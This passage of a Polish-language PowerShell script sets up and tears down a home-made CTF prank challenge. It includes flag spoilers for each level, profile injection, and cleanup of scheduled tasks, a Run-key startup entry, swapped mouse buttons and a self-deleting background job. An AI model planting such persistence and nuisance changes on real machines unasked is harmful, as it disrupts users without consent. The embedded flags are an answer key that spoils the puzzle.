            "    Rejestr DataA:              Q1RGe20zZDFVbV8=  ->  'CTF{m3d1Um_'",
            "    AppData\Microsoft\.ctfdata: Y2g0bGwzbmczfQ== ->  'ch4ll3ng3}'",
            "  Kompletna flaga: CTF{m3d1Um_ch4ll3ng3}"
        )
        3 = @(
            "  Trzy odlamki ROT13:",
            "    Rejestr Cipher1:                  PGS{u4eq    -> 'CTF{h4rd'",
            "    TEMP\ctf_h4rd.log:                _z0q3       -> '_m0d3'",
            "    AppData\WindowsApps\.ctf_sys:     _z4fg3e}    -> '_m4st3r}'",
            "  Kompletna flaga: CTF{h4rd_m0d3_m4st3r}"
        )
        4 = @(
            "  Flaga byla ukryta w fake VM:",
            "    vm-cat /opt/secret/.hidden_flag",
            "  Kompletna flaga: CTF{thr34t_hunt3r}"
        )
    }

    $spoilers[$d] | ForEach-Object { Write-Host $_ -ForegroundColor DarkGray }
    Write-Host ""
    Write-Host "  Usuwam wszystkie zmiany..." -ForegroundColor Yellow
    Start-Sleep 3
    Invoke-CTFCleanup -Difficulty $d
    Write-Host ""
    Write-Host "  Gotowe. Nastepnym razem sie uda... moze." -ForegroundColor DarkGray
    Write-Host "  Zrestartuj PowerShell." -ForegroundColor Yellow
}

# ================================================================
# WIN SCREEN
# ================================================================
function Show-WinScreen {
    param([string]$Flag, [int]$Difficulty)
    $reg = "HKCU:\Software\CTFChallenge"
    Clear-Host
    Write-Host ""
    Write-Host @"
  ██╗    ██╗██╗███╗   ██╗██╗
  ██║    ██║██║████╗  ██║██║
  ██║ █╗ ██║██║██╔██╗ ██║██║
  ██║███╗██║██║██║╚██╗██║╚═╝
  ╚███╔███╔╝██║██║ ╚████║██╗
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝
"@ -ForegroundColor Green

    Write-Host "  ╔══════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "  ║           CHALLENGE ROZWIAZANY!  BRAWO!             ║" -ForegroundColor Green
    Write-Host "  ╚══════════════════════════════════════════════════════╝" -ForegroundColor Green
    Write-Host ""
    $diffNames = @{1="Easy";2="Medium";3="Hard";4="TryHackMe"}
    Write-Host "  Poziom:     $($diffNames[$Difficulty])" -ForegroundColor Cyan

    $st = (Get-ItemProperty $reg -EA SilentlyContinue).StartTime
    if ($st) {
        $el = (Get-Date) - [datetime]$st
        Write-Host "  Czas:       $([math]::Floor($el.TotalMinutes)) min $($el.Seconds) sek" -ForegroundColor Cyan
    }

    Write-Host "  Flaga:      $Flag" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  Gratulacje! System zostanie teraz przywrocony." -ForegroundColor Magenta
    Write-Host ""
    Start-Sleep 3
}

# ================================================================
# CLEANUP FUNCTIONS
# ================================================================
function Invoke-CTFCleanup {
    param([int]$Difficulty)
    Write-Host "  Czyszcze..." -ForegroundColor Yellow
    if ($Difficulty -ge 1) { Invoke-CleanupEasy }
    if ($Difficulty -ge 2) { Invoke-CleanupMedium }
    if ($Difficulty -ge 3) { Invoke-CleanupHard }
    if ($Difficulty -eq 4) { Invoke-CleanupTryHackMe }
    Invoke-CleanupShared
    Write-Host "  [OK] Wszystkie zmiany cofniete." -ForegroundColor Green
    Write-Host "  [!] Zrestartuj PowerShell, by prompt wrocil do normy." -ForegroundColor Yellow
}

function Invoke-CleanupEasy {
    Unregister-ScheduledTask -TaskName "CTF_Reminder_Easy" -Confirm:$false -EA SilentlyContinue
    Remove-Item "$env:APPDATA\Microsoft\ctf_task_easy.ps1" -Force -EA SilentlyContinue
    Remove-Item "$env:TEMP\ctf_wallpaper.png" -Force -EA SilentlyContinue
    try { [CTFSystem]::ResetWallpaper() } catch {
        try {
            Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public class CTFWPReset { [DllImport("user32.dll",CharSet=CharSet.Auto)] public static extern bool SystemParametersInfo(uint a,uint b,string c,uint d); public static void Reset(){SystemParametersInfo(20,0,"",3);} }
"@
            [CTFWPReset]::Reset()
        } catch {}
    }
}

function Invoke-CleanupMedium {
    Unregister-ScheduledTask -TaskName "CTF_Reminder_Medium" -Confirm:$false -EA SilentlyContinue
    Remove-Item "$env:APPDATA\Microsoft\ctf_task_medium.ps1" -Force -EA SilentlyContinue
    Remove-Item "$env:APPDATA\Microsoft\.ctfdata" -Force -EA SilentlyContinue
    # Restore mouse
    $orig = (Get-ItemProperty "HKCU:\Software\CTFChallenge" -EA SilentlyContinue).OrigMouseSwap
    if ($orig -ne $null) {
        try { [CTFSystem]::SetMouseSwap([uint32]$orig) } catch {
            try {
                Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public class CTFMouseR { [DllImport("user32.dll")] public static extern bool SystemParametersInfo(uint a,uint b,IntPtr c,uint d); public static void Set(uint v){SystemParametersInfo(33,v,IntPtr.Zero,2);} }
"@
                [CTFMouseR]::Set([uint32]$orig)
            } catch {}
        }
    }
}

function Invoke-CleanupHard {
    Unregister-ScheduledTask -TaskName "CTF_Reminder_Hard" -Confirm:$false -EA SilentlyContinue
    Remove-Item "$env:APPDATA\Microsoft\ctf_task_hard.ps1" -Force -EA SilentlyContinue
    Remove-Item "$env:APPDATA\Microsoft\ctf_startup.ps1"   -Force -EA SilentlyContinue
    Remove-Item "$env:TEMP\ctf_h4rd.log"                    -Force -EA SilentlyContinue
    Remove-Item "$env:APPDATA\Microsoft\WindowsApps\.ctf_sys" -Force -EA SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "CTF_HardMode_Reminder" -EA SilentlyContinue
}

function Invoke-CleanupTryHackMe {
    Remove-Item "$env:TEMP\CTF_VM" -Recurse -Force -EA SilentlyContinue
}

function Invoke-CleanupShared {
    Remove-Item "HKCU:\Software\CTFChallenge" -Recurse -Force -EA SilentlyContinue
    # Strip profile fenced block
    if (Test-Path $PROFILE) {
        $raw     = Get-Content $PROFILE -Raw -EA SilentlyContinue
        $cleaned = $raw -replace "(?s)# === CTF_CHALLENGE_START ===.*?# === CTF_CHALLENGE_END ===\r?\n?", ""
        $cleaned | Set-Content $PROFILE
    }
    # Self-delete (last action - loaded in memory already)
    $self = "$env:APPDATA\Microsoft\ctf_functions.ps1"
    Start-Job { param($p) Start-Sleep 3; Remove-Item $p -Force -EA SilentlyContinue } -ArgumentList $self | Out-Null
}
'@

$fnContent | Out-File $FN_PATH -Encoding UTF8
Write-OK "ctf_functions.ps1 zapisany"
#endregion

# ================================================================
#region PROFILE INJECTION
# ================================================================
Write-Step "?" "Wstrzykuje blok do profilu PowerShell..."

if (!(Test-Path $PROFILE)) { New-Item -Path $PROFILE -ItemType File -Force | Out-Null }

$profileBlock = @"

$PS_START
# CTF Challenge aktywny — poziom: $diffName
function prompt {
    `$loc = Get-Location
    Write-Host " [CTF] " -ForegroundColor Red -NoNewline
    Write-Host "`$loc" -ForegroundColor Cyan -NoNewline
    Write-Host " > " -ForegroundColor DarkGray -NoNewline
    return " "
}
Write-Host ""
Write-Host "  +--------------------------------------------------+" -ForegroundColor Red
Write-Host "  |  [CTF AKTYWNY] Poziom: $diffName" -ForegroundColor Red
Write-Host "  |  Rozwiaz:  Submit-CTFFlag `"CTF{...}`"  " -ForegroundColor Yellow
$(if ($diff -eq 4) { 'Write-Host "  |  lub:      Start-CTFInvestigation      " -ForegroundColor Yellow' })
Write-Host "  |  Poddaj sie: Remove-CTFChallenge        " -ForegroundColor DarkGray
Write-Host "  +--------------------------------------------------+" -ForegroundColor Red
Write-Host ""
. "$FN_PATH"
$PS_END
"@

Add-Content -Path $PROFILE -Value $profileBlock
Write-OK "Profil zaktualizowany"
#endregion

# ================================================================
#region SUMMARY
# ================================================================
Write-Host ""
Write-Host "  ================================================================" -ForegroundColor Cyan
Write-Host "  CHALLENGE AKTYWNY — poziom: $diffName" -ForegroundColor Yellow
Write-Host "  ================================================================" -ForegroundColor Cyan
Write-Host ""

switch ($diff) {
    1 {
        Write-Host "  Co sie zmienilo:" -ForegroundColor White
        Write-Host "  - Tapeta zmieniona na Rick Astleya" -ForegroundColor DarkGray
        Write-Host "  - Co godzine pojawi sie terminal z przypomnieniem" -ForegroundColor DarkGray
        Write-Host "  - PowerShell prompt zmieniony" -ForegroundColor DarkGray
        Write-Host ""
        Write-Host "  Znajdz flage i uzyj:" -ForegroundColor Green
        Write-Host '  Submit-CTFFlag "CTF{...}"' -ForegroundColor Yellow
        Write-Host ""
        Write-Host "  Podpowiedz: Sprawdz HKCU:\Software\CTFChallenge" -ForegroundColor DarkGray
    }
    2 {
        Write-Host "  Co sie zmienilo:" -ForegroundColor White
        Write-Host "  - Tapeta + prompt + co-godzinny terminal [Easy]" -ForegroundColor DarkGray
        Write-Host "  - ODWROCONE PRZYCISKI MYSZY (lewy = prawy)" -ForegroundColor Red
        Write-Host "  - Co 30 min otwiera sie 3 okna terminala naraz" -ForegroundColor DarkGray
        Write-Host ""
        Write-Host "  Znajdz dwie czesci flagi base64 i uzyj:" -ForegroundColor Green
        Write-Host '  Submit-CTFFlag "CTF{...}"' -ForegroundColor Yellow
        Write-Host ""
        Write-Host "  Podpowiedz: Rejestr DataA + plik AppData\Microsoft\.ctfdata" -ForegroundColor DarkGray
    }
    3 {
        Write-Host "  Co sie zmienilo:" -ForegroundColor White
        Write-Host "  - Wszystko z Medium [Easy + Medium]" -ForegroundColor DarkGray
        Write-Host "  - WPIS STARTOWY - pojawi sie przy nastepnym logowaniu" -ForegroundColor Red
        Write-Host "  - Co 15 min otwiera sie 5 okien terminala naraz" -ForegroundColor Red
        Write-Host ""
        Write-Host "  Znajdz 3 odlamki ROT13 flagi i uzyj:" -ForegroundColor Green
        Write-Host '  Submit-CTFFlag "CTF{...}"' -ForegroundColor Yellow
        Write-Host ""
        Write-Host "  Podpowiedz: Rejestr Cipher1 + TEMP\ctf_h4rd.log + AppData\WindowsApps\.ctf_sys" -ForegroundColor DarkGray
        Write-Host "  ROT13 PS: ConvertFrom-Rot13 `"PGS{...`"" -ForegroundColor DarkGray
    }
    4 {
        Write-Host "  Srodowisko VM gotowe: $VMDIR" -ForegroundColor DarkGray
        Write-Host ""
        Write-Host "  Dostepne komendy: vm-ls, vm-cat, vm-grep, vm-find, vm-ps, vm-netstat" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "  Rozpocznij sledztwo:" -ForegroundColor Green
        Write-Host "  Start-CTFInvestigation" -ForegroundColor Yellow
    }
}

Write-Host ""
Write-Host "  Lub poddaj sie (wstyd): Remove-CTFChallenge" -ForegroundColor DarkGray
Write-Host "  ================================================================" -ForegroundColor Cyan
Write-Host ""

if ($diff -ne 4) {
    Start-Sleep 2
    Start-Process "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
}

Write-Host "  Zrestartuj PowerShell zeby zobaczyc zmieniony prompt!" -ForegroundColor Yellow
Start-Sleep 2

if ($diff -eq 4) {
    Write-Host ""
    Write-Host "  Startujemy sledztwo..." -ForegroundColor Magenta
    Start-Sleep 2
    . $FN_PATH
    Start-CTFInvestigation
}
#endregion
